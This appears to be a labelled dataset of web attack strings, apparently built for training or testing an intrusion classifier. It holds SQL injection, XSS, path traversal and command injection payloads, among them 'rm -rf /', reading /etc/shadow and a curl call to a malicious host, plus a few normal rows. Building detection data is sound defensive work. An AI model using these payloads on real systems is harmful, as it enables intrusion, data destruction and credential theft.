"' uNion SELECT null,{func}--",SQLi
' OR EXISTS(SELECT * FROM ,SQLi
| echo $PATH,Command-Injection
"' UNION SELECT null,{func}--",SQLi
<iframe src=javascript:{code}>,XSS
<{tag} ,XSS
,Normal
$({danger_cmd}),Command-Injection
"<object data=data:text/html;base64,{b64}>",XSS
<iframe src=javascript:{code}>,XSS
'; ,SQLi
%252e%252e%252f{enc_file},Path-Traversal
$({danger_cmd}),Command-Injection
"' UNION SELECT null,{func}--",SQLi
' oR EXISTS(SELECT * FROM ,SQLi
| rm -rf /,Command-Injection
../../../../{file},Path-Traversal
'{user}' aNd 1=1-- -,SQLi
' Or EXISTS(SELECT * FROM ,SQLi
`{unix_cmd}`,Command-Injection
../../../../{file},Path-Traversal
<%  %>,Command-Injection
%252e%252e%252f{enc_file},Path-Traversal
'{user}' oR 1=1-- -,SQLi
<{tag} src=x onerror={func}>,XSS
<{tag} src=x onerror={func}>,XSS
"' UNION SELECT null,{func}--",SQLi
../../../../{file},Path-Traversal
& cat /etc/shadow,Command-Injection
; ping -c 3 example.com,Command-Injection
' AnD EXISTS(SELECT * FROM ,SQLi
%252e%252e%252f{enc_file},Path-Traversal
'{user}' OR 1=1-- -,SQLi
,Normal
'; ,SQLi
"<object data=data:text/html;base64,{b64}>",XSS
' OR EXISTS(SELECT * FROM ,SQLi
& curl http://malicious.site,Command-Injection
<script>alert('XSS')</script>,XSS
../../../etc/passwd,Path-Traversal
' OR 'a'='a'--,SQLi
; ls -la,Command-Injection
wp-content/uploads/image.jpg,Normal
